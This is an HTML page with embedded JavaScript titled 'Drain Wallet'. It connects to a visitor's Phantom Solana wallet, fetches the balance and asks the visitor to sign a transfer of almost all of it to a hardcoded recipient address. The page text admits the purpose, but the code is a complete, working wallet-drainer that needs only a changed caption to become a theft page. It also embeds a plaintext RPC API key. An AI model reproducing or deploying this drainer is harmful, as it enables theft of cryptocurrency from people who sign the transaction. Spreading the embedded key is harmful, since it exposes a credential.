<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Drain Wallet</title>
    <!-- Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }

        .container { padding: 20px; width: 90%; }
        h1 { font-size: 2rem; margin-bottom: 10px; color: #ff4444; }
        p { color: #ccc; margin-bottom: 30px; }

        .btn-red {
            background-color: #ff4444;
            color: #fff;
            border: none;
            padding: 15px 40px;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 0 15px rgba(255, 68, 68, 0.4);
            width: 100%;
        }

        #status {
            margin-top: 20px;
            font-size: 0.9rem;
            color: #ff4444;
            min-height: 50px;
            word-wrap: break-word;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Drain Everything</h1>
        <p>Sends 100% of your SOL to my wallet.</p>
        
        <button id="drainBtn" class="btn-red" onclick="drainWallet()">Drain All</button>
        
        <div id="status"></div>
    </div>

    <script>
        // ==========================================
        // YOUR CONFIGURATION
        // ==========================================
        
        // YOUR WALLET ADDRESS (Recipient)
        const RECIENT_ADDRESS = "DHPZiwM4h1A3BepLauuW69X6udanmphUnyAnrzspWLPj"; 

        // YOUR API KEY
        const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=e67b03d4-9ec2-4eb7-a188-97f90fa26a45";

        async function drainWallet() {
            const statusDiv = document.getElementById("status");
            const btn = document.getElementById("drainBtn");

            if (!window.solana || !window.solana.isPhantom) {
                alert("Please install Phantom Wallet on your iPhone.");
                return;
            }

            try {
                statusDiv.innerText = "Connecting...";
                
                // 1. Connect to Phantom
                const resp = await window.solana.connect();
                const userPublicKey = resp.publicKey;
                
                // 2. Define Recipient
                let recipientPubkey;
                try {
                    recipientPubkey = new solanaWeb3.PublicKey(RECIENT_ADDRESS);
                } catch (e) {
                    alert("Invalid Recipient Address in code.");
                    return;
                }

                // 3. Get Connection and Current Balance
                const connection = new solanaWeb3.Connection(RPC_URL);
                
                statusDiv.innerText = "Fetching balance...";
                
                // Fetch the balance of the connected wallet
                const balanceInLamports = await connection.getBalance(userPublicKey);
                
                // Reserve a small amount for transaction fees (approx 5000 lamports)
                // This ensures the tx doesn't fail if balance is exact
                const feeReserve = 5000; 
                const amountToSend = balanceInLamports - feeReserve;

                if (amountToSend <= 0) {
                    alert("Wallet is empty or insufficient for fees.");
                    return;
                }

                statusDiv.innerText = `Found ${ (balanceInLamports / 1000000000).toFixed(4) } SOL. Draining...`;

                // 4. Create Transaction
                const transaction = new solanaWeb3.Transaction();
                
                // Transfer the MAX amount
                transaction.add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userPublicKey,
                        toPubkey: recipientPubkey,
                        lamports: amountToSend 
                    })
                );

                // 5. Fetch Recent Blockhash
                statusDiv.innerText = "Finalizing...";
                
                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
                
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = userPublicKey;

                // 6. Sign AND Send (Modern Phantom Method)
                statusDiv.innerText = "Sign Green...";
                
                const result = await window.solana.signAndSendTransaction(transaction, {
                    skipPreflight: false,
                    commitment: 'singleGossip'
                });

                console.log("Drain Sent:", result.signature);
                
                alert(`Success! Drained ${ (amountToSend / 1000000000).toFixed(5) } SOL.`);
                btn.style.display = 'none';
                statusDiv.innerText = "Sent: " + result.signature;

            } catch (err) {
                console.error(err);
                if (err.message && err.message.includes("User rejected")) {
                    statusDiv.innerText = "Cancelled by user.";
                } else {
                    alert("Error: " + (err.message || "Unknown error"));
                    statusDiv.innerText = "Error: " + (err.message || "Unknown error");
                }
            }
        }
    </script>
</body>
</html>
